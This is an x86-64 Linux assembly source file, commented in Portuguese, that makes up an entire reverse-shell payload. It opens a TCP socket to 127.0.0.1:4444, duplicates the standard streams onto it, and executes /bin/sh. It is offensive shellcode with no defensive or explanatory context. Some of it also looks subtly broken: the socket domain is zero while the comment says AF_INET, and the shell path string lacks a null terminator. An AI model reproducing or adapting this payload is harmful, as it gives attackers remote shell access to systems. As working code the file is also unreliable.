section .text
    global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi            ; AF_INET
    mov     sil, 1              ; SOCK_STREAM
    xor     rdx, rdx            ; protocol = 0
    syscall

    mov     rdi, rax            ; sockfd

    ; aloca struct sockaddr_in na stack com alinhamento correto
    sub     rsp, 16
    mov     word [rsp], 2              ; AF_INET
    mov     word [rsp+2], 0x5c11       ; PORT 4444 em big endian
    mov     dword [rsp+4], 0x0100007f  ; IP 127.0.0.1 (little endian)
    xor     rax, rax
    mov     [rsp+8], rax               ; zero[8]

    mov     rsi, rsp                   ; ponteiro para sockaddr_in
    mov     al, 42                     ; syscall: connect
    mov     dl, 16
    syscall

    test    rax, rax
    js      fail

    ; dup2 loop (stdin, stdout, stderr)
    xor     rsi, rsi

dup_loop:
    mov     al, 33                     ; syscall: dup2
    syscall
    inc     rsi
    cmp     rsi, 3
    jl      dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor     rax, rax
    mov     rbx, 0x68732f6e69622f2f    ; //bin/sh
    push    rbx
    mov     rdi, rsp                   ; pathname
    xor     rsi, rsi                   ; argv = NULL
    xor     rdx, rdx                   ; envp = NULL
    mov     al, 59                     ; syscall: execve
    syscall

fail:
    ; exit(1)
    mov     rdi, 1
    mov     al, 60
    syscall
